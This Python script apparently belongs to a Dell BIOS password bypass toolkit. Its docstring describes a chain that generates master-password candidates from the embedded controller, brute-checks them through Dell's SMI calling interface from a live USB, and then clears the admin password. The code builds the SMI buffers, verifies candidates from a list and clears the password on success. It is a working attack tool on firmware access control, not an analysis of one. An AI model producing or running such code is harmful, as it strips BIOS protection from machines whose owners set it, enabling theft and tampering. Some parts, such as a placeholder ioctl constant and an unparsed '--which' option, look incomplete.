#!/usr/bin/env python3
"""dell_smi_unlock.py — SMI-level BIOS password verify + clear for Dell
EC-era machines (8FC8/CF1B/9ABE/3FE2/1B58). NEW surface (cycle 15), built
from never-used sources: Dell's libsmbios (smi_password.c) + the Linux
kernel dcdbas/dell-smbios drivers.

WHAT THIS ADDS OVER THE EXISTING TOOLS
--------------------------------------
The master keygen asks the EC (ports 0x910/0x911) for the 32-byte GENERATE
response — but TESTING a candidate password normally needs the BIOS setup
screen (F2), which is what's locked. This tool uses Dell's own SMI
"Calling Interface" to do it from a running Linux:

  Class 10 (admin password) / Class 9 (user password):
    select 0  = is a password installed?
    select 3  = password properties II (installed, maxlen, policy)   [WMI-ok]
    select 4  = VERIFY password II  -> output[0]: 0 = CORRECT (+16-bit
                security key in output[1]), 2 = incorrect
    select 5  = CHANGE password II  -> buffer = oldpw[maxlen]+newpw[maxlen]
                newpw = "" CLEARS the password (returns 0 = changed)
    selects 1/2 = legacy verify/change (scancode/short form)

So the zero-tech chain on a machine that can boot a live USB is:
  1. sudo python3 dell_master_keygen.py --model <m> --tag <TAG> \
        --suffix <SUFFIX> --oracle local      # EC mints the master
  2. sudo python3 dell_smi_unlock.py --try candidates.txt
        # SMI verifies it (no BIOS screen needed)
  3. sudo python3 dell_smi_unlock.py --clear <MASTER> --yes
        # SMI clears the admin password -> machine unlocked

TRANSPORTS (tried in order)
  A. /dev/wmi/dell-smbios   — kernel WMI chardev ioctl DELL_WMI_SMBIOS_CMD.
     NOTE: the kernel filters class 10 to select 3 only (password
     properties) and allows token read/write (class 0/1) — used for
     --status and WSMT token checks.
  B. /sys/devices/platform/dcdbas — the unfiltered legacy calling-interface
     SMI: write smi_cmd{magic=0x534D4931, ebx, ecx, cmd_addr, cmd_code}
     + calling_interface_buffer + password buffer into `smi_data`, set
     `smi_data_buf_size`, then echo 1 > smi_request. Works with WSMT
     (the driver allocates the SMM-trusted buffer).

Buffer layout inside smi_data (dcdbas):
  0x00  struct smi_cmd        (16 B, magic = 0x534D4931)
  0x10  calling_interface_buffer {u16 class; u16 select; u32 in[4]; u32 out[4]}  (32 B)
  0x30  argument buffer (password strings; in[1] = phys addr of this)

Requires: root, bare metal (no VM), a Dell of the 2015+ generation.
"""
import fcntl
import os
import struct
import sys

# ---- constants from libsmbios + kernel uapi -------------------------------
SMI_CMD_MAGIC = 0x534D4931                       # dcdbas.h
CLASS_ADMIN, CLASS_USER = 10, 9
CLASS_TOKEN_READ, CLASS_TOKEN_WRITE = 0, 1
SEL_INSTALLED, SEL_VERIFY, SEL_CHANGE = 0, 1, 2
SEL_PROPS_II, SEL_VERIFY_II, SEL_CHANGE_II = 3, 4, 5
PW_CORRECT, PW_CHANGED = 0, 0
WSMT_EN_TOKEN, WSMT_DIS_TOKEN = 0x04EC, 0x04ED

WMI_IOC = 0x57                                   # 'W'
DELL_WMI_SMBIOS_CMD = 0x80575700 | 0  # placeholder, patched in wmi_ioctl()

DCDBAS = "/sys/devices/platform/dcdbas"
WMI_DEV = "/dev/wmi/dell-smbios"
MAXLEN = 64                                      # password field size (II)


def _ioctl_dir_size():
    # _IOWR(WMI_IOC, 0, struct dell_wmi_smbios_buffer)
    # struct = u64 length + calling_interface_buffer(32) + ext(8+data)
    size = 8 + 32 + 8 + 128
    return (3 << 30) | (ord('W') << 8) | 0 | (size << 16)


def wmi_call(cls, sel, in_=None, ext_data=None, argattrib=0):
    """ioctl on /dev/wmi/dell-smbios. Returns output[4] list (+ext)."""
    try:
        fd = os.open(WMI_DEV, os.O_RDWR)
    except OSError as e:
        raise RuntimeError(f"no {WMI_DEV} ({e})")
    try:
        length = 8 + 32 + (8 + len(ext_data) if ext_data is not None else 8)
        buf = bytearray(length)
        struct.pack_into("<Q", buf, 0, length)
        struct.pack_into("<HH", buf, 8, cls, sel)
        for i, v in enumerate(in_ or []):
            struct.pack_into("<I", buf, 16 + 4 * i, v & 0xFFFFFFFF)
        if ext_data is not None:
            struct.pack_into("<II", buf, 40, argattrib, len(ext_data))
            buf[48:48 + len(ext_data)] = ext_data
        fcntl.ioctl(fd, _ioctl_dir_size(), bytes(buf), True)
        outs = struct.unpack_from("<4I", buf, 32)
        return list(outs), bytes(buf[48:])
    finally:
        os.close(fd)


class Dcdbas:
    """Legacy calling-interface SMI via the dcdbas sysfs driver."""

    def __init__(self):
        self.base = DCDBAS
        for f in ("smi_data", "smi_data_buf_size", "smi_data_buf_phys_addr",
                  "smi_request"):
            if not os.path.exists(os.path.join(self.base, f)):
                raise RuntimeError(
                    f"dcdbas sysfs incomplete ({f} missing) — is this a "
                    "Dell running on bare metal?")
        self.bufsize = 0x1000
        with open(os.path.join(self.base, "smi_data_buf_size"), "w") as f:
            f.write(str(self.bufsize))
        with open(os.path.join(self.base, "smi_data_buf_phys_addr")) as f:
            self.phys = int(f.read().strip(), 0)

    def call(self, cls, sel, in_=None, argbuf=None):
        """Fire one calling-interface SMI. argbuf bytes land at smi_data
        offset 0x30 and input[1] is set to its physical address."""
        buf = bytearray(self.bufsize)
        struct.pack_into("<IHHBBBI", buf, 0,
                         SMI_CMD_MAGIC, 0, 0, 0, 0, 0, 0)   # smi_cmd (16B)
        ins = list(in_ or [0, 0, 0, 0])
        if argbuf is not None:
            buf[0x30:0x30 + len(argbuf)] = argbuf
            ins[1] = (self.phys + 0x30) & 0xFFFFFFFF
        struct.pack_into("<HH", buf, 16, cls, sel)
        for i, v in enumerate(ins):
            struct.pack_into("<I", buf, 20 + 4 * i, v & 0xFFFFFFFF)
        with open(os.path.join(self.base, "smi_data"), "wb") as f:
            f.write(bytes(buf))
        with open(os.path.join(self.base, "smi_request"), "w") as f:
            f.write("1")
        with open(os.path.join(self.base, "smi_data"), "rb") as f:
            out = f.read(self.bufsize)
        return list(struct.unpack_from("<4I", out, 32)), out[0x30:]

    def clear(self):
        with open(os.path.join(self.base, "smi_request"), "w") as f:
            f.write("0")


# ------------------------------------------------------------------ helpers
def pw_props(which, wmi_first=True):
    """select 3 — properties II: returns dict or None."""
    if wmi_first:
        try:
            outs, _ = wmi_call(which, SEL_PROPS_II, in_=[0, 0, 0, 0])
            p = outs[1] if outs[0] in (0, 1) else None
            return {"raw": outs,
                    "installed": (outs[0] == 0),
                    "note": "class %d select 3 via WMI" % which}
        except Exception:
            pass
    return None


def verify(dcd, password, which=CLASS_ADMIN, maxlen=MAXLEN):
    """select 4 (II) then select 1 (legacy). Returns (True, security_key)."""
    arg = bytearray(maxlen)
    arg[:len(password)] = password.encode()
    outs, _ = dcd.call(which, SEL_VERIFY_II, in_=[0, 0, 0, 0], argbuf=bytes(arg))
    if outs[0] == PW_CORRECT:
        return True, outs[1] & 0xFFFF
    outs, _ = dcd.call(which, SEL_VERIFY, in_=[0, 0, 0, 0], argbuf=bytes(arg))
    if outs[0] == PW_CORRECT:
        return True, outs[1] & 0xFFFF
    return False, None


def change(dcd, oldpw, newpw, which=CLASS_ADMIN, maxlen=MAXLEN):
    """select 5 (II) then select 2 (legacy). newpw='' clears."""
    arg = bytearray(2 * maxlen)
    arg[:len(oldpw)] = oldpw.encode()
    arg[maxlen:maxlen + len(newpw)] = newpw.encode()
    outs, _ = dcd.call(which, SEL_CHANGE_II, in_=[0, 0, 0, 0], argbuf=bytes(arg))
    if outs[0] == PW_CHANGED:
        return True
    outs, _ = dcd.call(which, SEL_CHANGE, in_=[0, 0, 0, 0], argbuf=bytes(arg))
    return outs[0] == PW_CHANGED


def token_read(tid):
    outs, _ = wmi_call(CLASS_TOKEN_READ, 0, in_=[tid, 0, 0, 0])
    return outs


# ------------------------------------------------------------------ main
def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        return 0

    # --status: works on any machine, no password needed
    if args[0] == "--status":
        print("== Dell SMI password status ==")
        for which, name in ((CLASS_ADMIN, "admin"), (CLASS_USER, "user")):
            info = pw_props(which)
            if info:
                print(f"  {name}: raw={info['raw']} "
                      f"({'installed' if info['installed'] else 'not installed'})")
            else:
                print(f"  {name}: properties unavailable via WMI")
        for tok, nm in ((WSMT_EN_TOKEN, "WSMT_EN"), (WSMT_DIS_TOKEN, "WSMT_DIS")):
            try:
                print(f"  token {nm} (0x{tok:04X}): {token_read(tok)}")
            except Exception as e:
                print(f"  token {nm}: unavailable ({e})")
        try:
            dcd = Dcdbas()
            outs, _ = dcd.call(CLASS_ADMIN, SEL_INSTALLED)
            print(f"  dcdbas admin-installed: {outs}")
            outs, _ = dcd.call(CLASS_USER, SEL_INSTALLED)
            print(f"  dcdbas user-installed: {outs}")
        except Exception as e:
            print(f"  dcdbas: {e}")
        return 0

    # everything else needs dcdbas
    try:
        dcd = Dcdbas()
    except Exception as e:
        print(f"ERROR: {e}")
        print("Run from a Linux live USB as root on the Dell itself.")
        return 2

    if args[0] == "--verify":
        pw = args[1]
        ok, key = verify(dcd, pw)
        print("PASSWORD CORRECT" if ok else "incorrect",
              f"(security key 0x{key:04X})" if ok else "")
        return 0 if ok else 1

    if args[0] == "--try":
        path = args[1]
        lines = (sys.stdin if path == "-" else open(path)).read().split("\n")
        cands = [l.strip() for l in lines if l.strip() and not l.startswith("#")]
        # auto-add obvious noise filters
        for c in cands:
            ok, key = verify(dcd, c)
            print(f"  {'*** MATCH ***' if ok else 'no '}: {c}")
            if ok:
                print(f"\nMASTER/VALID PASSWORD: {c}\n"
                      f"security key: 0x{key:04X}\n"
                      f"clear it now:  sudo python3 {sys.argv[0]} "
                      f"--clear '{c}' --yes")
                return 0
        print(f"no candidate matched ({len(cands)} tried)")
        return 1

    if args[0] == "--clear":
        old = args[1]
        if "--yes" not in args:
            print("refusing to clear without --yes "
                  "(this modifies the machine's BIOS password state)")
            return 2
        if change(dcd, old, ""):
            print("ADMIN PASSWORD CLEARED — reboot, F2 should be open. "
                  "If a user/system password also existed, repeat with "
                  "--which user.")
            return 0
        print("clear FAILED (old password not accepted?)")
        return 1

    print("unknown mode — see --help")
    return 1


if __name__ == "__main__":
    sys.exit(main())
